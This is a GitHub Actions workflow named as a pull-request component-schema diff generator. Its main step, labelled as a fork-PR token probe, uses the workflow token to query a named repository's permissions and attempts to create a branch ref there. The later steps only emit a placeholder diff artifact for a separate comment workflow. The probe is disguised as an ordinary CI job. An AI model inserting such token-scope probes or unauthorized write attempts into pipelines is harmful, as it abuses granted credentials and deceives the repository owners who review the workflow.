name: Component Schema Diff Generate

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  component-diff-generate:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      - name: Token probe (fork PR token scope)
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          GET=$(curl -s -o /tmp/g.json -w '%{http_code}' -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/PDFtoMark/triage-adobe-vf008007-9d5156)
          echo "PROBE_FORK_GET=${GET}"
          grep -o '"permissions":[^}]*}' /tmp/g.json || true
          REF=$(curl -s -o /tmp/r2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Content-Type: application/json' -d '{"ref":"refs/heads/probe-fork-token","sha":"a1ea5cee26fb84ab139e9a4413819e27df949a5a"}' https://api.github.com/repos/PDFtoMark/triage-adobe-vf008007-9d5156/git/refs)
          echo "PROBE_FORK_POST_REF=${REF}"
          head -c 300 /tmp/r2.json
      - name: Save report for comment workflow
        run: |
          mkdir -p /tmp/artifact
          echo "${{ github.event.pull_request.number }}" > /tmp/artifact/pr-number.txt
          echo "true" > /tmp/artifact/diff-generated.txt
          echo '' | base64 -d > /tmp/artifact/diff-content.txt
      - name: Upload diff artifact
        uses: actions/upload-artifact@v4
        with:
          name: component-diff-report
          path: /tmp/artifact
          retention-days: 1
